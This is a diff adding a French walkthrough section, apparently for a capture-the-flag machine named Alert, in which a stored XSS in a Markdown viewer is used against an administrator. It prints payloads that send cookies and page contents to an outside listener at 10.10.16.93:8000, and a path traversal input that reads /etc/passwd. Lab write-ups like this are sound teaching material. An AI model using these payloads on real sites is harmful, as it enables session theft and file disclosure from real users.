@@ -454,9 +454,236 @@ Port 80 (http)
 
 ## Prise pied
 
-- Vecteur d'entrée confirmé (faille, creds, LFI/RFI, upload…).
-- Payloads utilisés (extraits pertinents).
-- Stabilisation du shell (pty, rlwrap, tmux…), preuve d'accès (`id`, `whoami`, `hostname`).
+Lorsque tu accèdes à `http://alert.htb`, tu arrives sur la page **“Markdown Viewer”**, qui est la première page affichée par l’application.
+
+
+
+![Interface Markdown Viewer avec upload de fichier Markdown et bouton Browse sur alert.htb](markdown-viewer.png)
+
+Sur cette page, un menu te permet de naviguer entre plusieurs pages :
+ **Markdown Viewer**, **Contact us**, **About us** et **Donate**.
+
+La page **Markdown Viewer** attire particulièrement l’attention, car la présence d’un bouton **“Browse”** suggère un mécanisme d’upload de fichiers Markdown.
+
+C’est cette fonctionnalité d’upload de fichiers `.md` que tu vas explorer dans la suite de l’analyse.
+
+### Test du rendu Markdown
+
+Pour commencer, tu peux créer un premier fichier Markdown simple afin de comprendre comment le contenu est traité par l’application.
+
+Par exemple, crée un fichier `test.md` avec le contenu suivant :
+
+```markdown
+# Test Markdown
+
+Ceci est un test.Ensuite :
+```
+
+Ensuite :
+
+1. Clique sur le bouton **“Browse”**
+2. Sélectionne ton fichier `test.md`
+3. Clique sur **“View Markdown”** pour uploader et afficher le contenu
+
+Le contenu est alors affiché dans l’interface.
+
+![Affichage du fichier test.md dans Markdown Viewer après upload sur alert.htb](view-test-md.png)
+
+
+
+> **Note :** un bouton **“Share Markdown”** est également présent sur la page et pourrait permettre de générer un lien de partage du contenu. Cette fonctionnalité sera analysée plus loin.
+
+Ce premier test te permet de valider que :
+
+- les fichiers `.md` sont bien acceptés
+- le contenu est interprété et rendu dans le navigateur
+
+À ce stade, tu contrôles donc directement le contenu affiché dans la page.
+
+### Injection XSS dans le Markdown
+
+Maintenant que tu contrôles le contenu affiché via le fichier `.md`, l’étape suivante consiste à tester si ce contenu est correctement filtré.
+
+Pour cela, tu peux modifier ton fichier `test.md` en y ajoutant un script simple :
+
+```
+# Test XSS
+
+<script>alert(1)</script>
+```
+
+Ensuite, répète les mêmes étapes :
+
+1. Clique sur **“Browse”**
+2. Sélectionne ton fichier `test.md`
+3. Clique sur **“View Markdown”**
+
+
+#### Observation du comportement
+
+Lors de l’affichage du message, une alerte JavaScript apparaît.
+
+Cela signifie que le code JavaScript est exécuté directement dans ton navigateur.
+
+#### Analyse
+
+Ce comportement indique clairement que :
+
+- le contenu Markdown n’est **pas correctement filtré**
+- les balises `<script>` sont **interprétées par le navigateur**
+- il est possible d’injecter et d’exécuter du JavaScript
+
+Tu es donc face à une **faille XSS (Cross-Site Scripting)**, une vulnérabilité qui permet d’injecter et d’exécuter du code JavaScript dans le navigateur d’un utilisateur.
+
+Dans ce cas, il s’agit très probablement d’une **XSS stockée (Stored XSS)**, c’est-à-dire que le code malveillant est enregistré par l’application et exécuté à chaque affichage.
+
+#### Impact
+
+À ce stade, tu peux :
+
+- exécuter du JavaScript dans ton propre navigateur
+- modifier dynamiquement le contenu de la page
+- interagir avec l’application côté client
+
+Mais surtout, si ce contenu est consulté par un autre utilisateur, le script s’exécutera dans **son navigateur, avec ses droits**.
+
+Si tu parviens à faire lire ce contenu par un **administrateur**, tu pourras alors exécuter du code dans **son navigateur**, comme si tu étais **administrateur de l’application**, avec les mêmes droits et possibilités.
+
+### Exploitation de la XSS
+
+Maintenant que tu sais que tu peux exécuter du JavaScript dans ton navigateur, tu peux tester s’il est possible d’extraire des informations depuis la page.
+
+Une première idée consiste à récupérer les cookies de session, car ils sont utilisés par l’application pour reconnaître un utilisateur déjà connecté. Les récupérer peut donc permettre d’usurper son identité.
+
+Pour cela, tu peux modifier ton fichier `test.md` avec le contenu suivant :
+
+
+
+```markdown
+# Alert Test
+
+Ceci est un test Markdown.
+
+<script>
+new Image().src="http://10.10.16.93:8000/?c="+document.cookie;
+</script>
+```
+
+
+
+------
+
+### Passage au contexte administrateur
+
+L’application propose une fonctionnalité **“Contact us”** permettant de transmettre un lien à un administrateur.
+
+L’objectif devient alors clair :
+
+- créer un message contenant un payload XSS
+- récupérer son lien via “Share”
+- envoyer ce lien à l’administrateur
+
+Lorsque l’admin ouvre le message, le JavaScript s’exécute **dans son navigateur**, avec ses privilèges.
+
+------
+
+### Exfiltration de contenu avec JavaScript
+
+Une fois le XSS confirmé, on peut aller plus loin que de simples alertes.
+
+L’idée est d’utiliser JavaScript pour :
+
+1. envoyer une requête vers une ressource interne
+2. récupérer son contenu
+3. l’exfiltrer vers notre machine
+
+Un premier test consiste à récupérer la page suivante :
+
+```
+http://alert.htb/messages.php
+```
+
+Payload utilisé :
+
+```
+<script>
+fetch('http://alert.htb/messages.php')
+  .then(r => r.text())
+  .then(data => {
+    new Image().src = 'http://10.10.16.93:8000/?d=' + btoa(data);
+  });
+</script>
+```
+
+👉 Explication :
+
+- `fetch()` récupère le contenu de la page
+- `r.text()` convertit la réponse en texte
+- `btoa()` encode les données en base64
+- `new Image().src` envoie les données vers notre serveur
+
+Lorsque l’administrateur charge la page piégée, une requête est envoyée vers notre machine contenant les données récupérées.
+
+------
+
+### Découverte d’un point d’entrée LFI
+
+La réponse obtenue révèle la présence de paramètres intéressants :
+
+```
+messages.php?file=...
+```
+
+Cela suggère que l’application permet de lire des fichiers côté serveur.
+
+On teste alors une inclusion de fichier classique :
+
+```
+../../../../etc/passwd
+```
+
+Payload final :
+
+```
+<script>
+fetch('http://alert.htb/messages.php?file=../../../../etc/passwd')
+  .then(r => r.text())
+  .then(data => {
+    new Image().src = 'http://10.10.16.93:8000/?d=' + btoa(data);
+  });
+</script>
+```
+
+------
+
+### Validation de la lecture de fichiers
+
+Après envoi du lien à l’administrateur, on reçoit sur notre serveur le contenu encodé.
+
+Une fois décodé, on obtient :
+
+```
+root:x:0:0:root:/root:/bin/bash
+...
+```
+
+👉 La vulnérabilité est confirmée :
+
+- XSS stockée → exécution côté admin
+- - LFI via `messages.php`
+- = **lecture arbitraire de fichiers sur le serveur**
+
+------
+
+### Conclusion de la prise de pied
+
+À ce stade, on dispose :
+
+- d’une exécution JavaScript dans le navigateur admin
+- d’un accès indirect aux fichiers du serveur
+- d’un canal d’exfiltration fiable
+
+👉 Cela constitue une **prise de pied complète côté web**, permettant d’envisager la récupération de credentials ou d’autres fichiers sensibles pour aller plus loin.
 
 ---
 
